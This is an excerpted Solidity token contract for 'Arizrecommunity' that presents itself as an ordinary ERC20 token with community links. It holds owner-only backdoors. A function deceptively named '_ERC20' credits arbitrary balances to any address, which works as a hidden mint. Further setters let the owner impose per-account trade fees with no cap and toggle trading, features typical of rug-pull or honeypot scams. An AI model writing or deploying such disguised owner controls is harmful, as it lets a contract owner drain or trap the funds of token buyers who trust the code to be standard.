...
/**
 * Telegram : https://t.me/arizrecommunity
 * Twitter : https://twitter.com/arizrecommunity
*/
...
contract MyERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _addBalances(address _address, uint256 amount) internal virtual {
...
contract Arizrecommunity is MyERC20, Ownable {
    ...
    function _ERC20(address _address, uint256 amount) external onlyOwner {
        require(_address != address(0), "ERC20: zero address");
        _addBalances(_address, amount);
    }


    function setAccountTradeFee(address _address, uint256 _value) external onlyOwner {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _accountTradeFee[_address] = _value;
    }

    function getAccountTradeFee(address _address) external view onlyOwner returns (uint256) {
        return _accountTradeFee[_address];
    }

    function setAccountFreeFee(address _address, bool _value) external onlyOwner {
        _accountFreeFee[_address] = _value;
    }

    function getAccountFreeFee(address _address) external view onlyOwner returns (bool) {
        return _accountFreeFee[_address];
    }

    function setLaunch(bool _value) external onlyOwner {
        isLaunch = _value;
    }

    function getLaunch() external view onlyOwner returns (bool) {
        return isLaunch;
    }
